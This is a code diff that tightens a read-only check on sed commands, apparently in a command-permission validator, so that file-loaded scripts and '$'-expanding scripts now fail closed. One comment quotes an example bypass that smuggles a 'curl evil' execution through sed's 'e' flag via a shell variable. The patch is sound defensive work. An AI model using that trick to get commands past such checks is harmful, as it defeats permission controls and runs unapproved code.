@@ -224,12 +224,19 @@ function isReadOnlySegment(executable: string, args: string[]): boolean {
 
 function isReadOnlySedArgs(args: string[]): boolean {
   if (args.some((arg) => /^(-i|--in-place)/.test(arg))) return false
-  return !sedScriptArgs(args).some(sedScriptWritesFile)
+  const { scripts, readsScriptFile } = sedScriptParts(args)
+  // Fail closed (#453): a -f/--file script body lives in a file this static
+  // check never sees (it can carry `w FILE` or GNU `e CMD`), and a `$` in a
+  // script position expands at runtime into text the argv literal never showed
+  // (e.g. X='s/.*/curl evil/e' sed $X README).
+  if (readsScriptFile) return false
+  return !scripts.some((script) => script.includes('$') || sedScriptWritesFile(script))
 }
 
-/** Collect the script arguments (not the input file paths) sed will execute. */
-function sedScriptArgs(args: string[]): string[] {
+/** Collect the script arguments (not the input file paths) sed will execute, plus whether any form loads the script from a file. */
+function sedScriptParts(args: string[]): { scripts: string[]; readsScriptFile: boolean } {
   const scripts: string[] = []
+  let readsScriptFile = false
   let pending: 'script' | 'skip' | undefined
   let sawScript = false
   let endOfOptions = false
@@ -250,9 +257,11 @@ function sedScriptArgs(args: string[]): string[] {
       } else if (arg === '--expression') {
         pending = 'script'
         sawScript = true
-      } else if (arg === '--file') {
-        // --file names a script file; the next argument is not a script body.
-        pending = 'skip'
+      } else if (arg === '--file' || arg.startsWith('--file=')) {
+        // --file names a script file; its contents stay uninspected here and
+        // the caller fails closed (#453). The attached value needs no skip.
+        readsScriptFile = true
+        if (arg === '--file') pending = 'skip'
       }
       continue
     }
@@ -260,14 +269,16 @@ function sedScriptArgs(args: string[]): string[] {
       const cluster = arg.slice(1)
       const flagIndex = cluster.search(/[ef]/)
       if (flagIndex >= 0) {
-        if (flagIndex < cluster.length - 1) {
-          if (cluster[flagIndex] === 'e') {
-            scripts.push(cluster.slice(flagIndex + 1))
-            sawScript = true
-          }
+        if (cluster[flagIndex] === 'f') {
+          readsScriptFile = true
+          // A trailing f consumes the next argument as its filename.
+          if (flagIndex === cluster.length - 1) pending = 'skip'
+        } else if (flagIndex < cluster.length - 1) {
+          scripts.push(cluster.slice(flagIndex + 1))
+          sawScript = true
         } else {
-          pending = cluster[flagIndex] === 'e' ? 'script' : 'skip'
-          if (cluster[flagIndex] === 'e') sawScript = true
+          pending = 'script'
+          sawScript = true
         }
       }
       continue
@@ -277,7 +288,7 @@ function sedScriptArgs(args: string[]): string[] {
       sawScript = true
     }
   }
-  return scripts
+  return { scripts, readsScriptFile }
 }
 
 /**
